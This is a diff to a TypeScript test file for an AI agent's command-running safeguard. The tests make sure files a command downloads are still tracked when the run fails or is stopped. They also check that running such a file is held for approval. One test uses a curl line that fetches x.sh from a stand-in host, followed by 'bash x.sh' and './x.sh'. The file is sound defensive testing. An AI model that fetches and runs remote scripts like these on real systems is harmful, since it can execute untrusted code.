@@ -840,14 +840,44 @@ describe("running and what comes back (§3.8.3 steps 12-14, §3.8.6)", () => {
     expect(h.audit.find(e => e.phase === "ended")).toMatchObject({ typedLines: 1, secretSpans: 1 });
   });
 
-  it("records what a command downloaded only when it ended with exit code 0", async () => {
+  it("records what a command downloaded whenever it started, whatever its end (D4.3 f)", async () => {
     makeJudge({ classify: () => ordinary({ downloads: ["/home/ana/get.sh"] }) });
-    const failed = harness({ run: () => ({ exit: exitOk({ code: 1 }) }) });
-    await call(failed);
-    expect([...failed.ctx.state.downloaded]).toEqual([]);
-    const ok = harness();
-    await call(ok);
-    expect([...ok.ctx.state.downloaded]).toEqual(["/home/ana/get.sh"]);
+    const ends: RunExit[] = [
+      exitOk(), exitOk({ code: 1 }), exitOk({ code: null, signal: "SIGINT", ended: "stopped-user" }), exitOk({ code: null, signal: "SIGTERM", ended: "timeout" }),
+      exitOk({ code: null, ended: "killswitch" }), exitOk({ code: null, ended: "lost" }),
+    ];
+    for (const exit of ends) {
+      const h = harness({ run: () => ({ exit }) });
+      await call(h);
+      expect([...h.ctx.state.downloaded], exit.ended).toEqual(["/home/ana/get.sh"]);
+    }
+    // A run the command window couldn't show was started, then stopped at once: what it may have fetched counts too.
+    const unseen = harness({ run: () => ({ hang: true }) });
+    unseen.ctx.service.window.attach = () => { throw new Error("no window"); };
+    await call(unseen);
+    expect([...unseen.ctx.state.downloaded]).toEqual(["/home/ana/get.sh"]);
+    // One that never started, or that the remote's own check refused, fetched nothing.
+    for (const exit of [exitOk({ code: null, ended: "failed-to-start", error: "no shell" }), exitOk({ code: null, ended: "refused-remote", error: "no" })]) {
+      const h = harness({ run: () => ({ exit }) });
+      await call(h);
+      expect([...h.ctx.state.downloaded], exit.ended).toEqual([]);
+    }
+  });
+
+  it("asks before running a file a failed command line downloaded earlier in the task (CL's own judge)", async () => {
+    setCommandJudge(null);
+    // The fetch succeeds but the line as a whole exits 1: x.sh is on disk all the same.
+    const h = harness({ binding: LOCAL, paths: p => ({ exists: false, real: p }), run: () => ({ exit: exitOk({ code: 1 }) }), answers: ["deny", "deny"] });
+    const first = await call(h, { target: "this computer", command: "curl -fsSL -o x.sh https://e.example/x.sh; ls missing" });
+    expect(first.resultType).toBe("failure");
+    expect(h.asked).toEqual([]);
+    expect([...h.ctx.state.downloaded]).toEqual(["/home/ana/x.sh"]);
+    for (const [k, command] of ["bash x.sh", "./x.sh"].entries()) {
+      expect((await call(h, { target: "this computer", command })).resultType, command).toBe("denied");
+      expect((h.asked[k].panel as { card: CommandCard }).card.says, command).toContain("Runs a file downloaded in this task.");
+      expect(h.audit.filter(e => e.phase === "decided").at(-1)?.rules, command).toContain("escape.run-downloaded");
+    }
+    expect(h.starts).toHaveLength(1);
   });
 
   it("one command at a time per task", async () => {
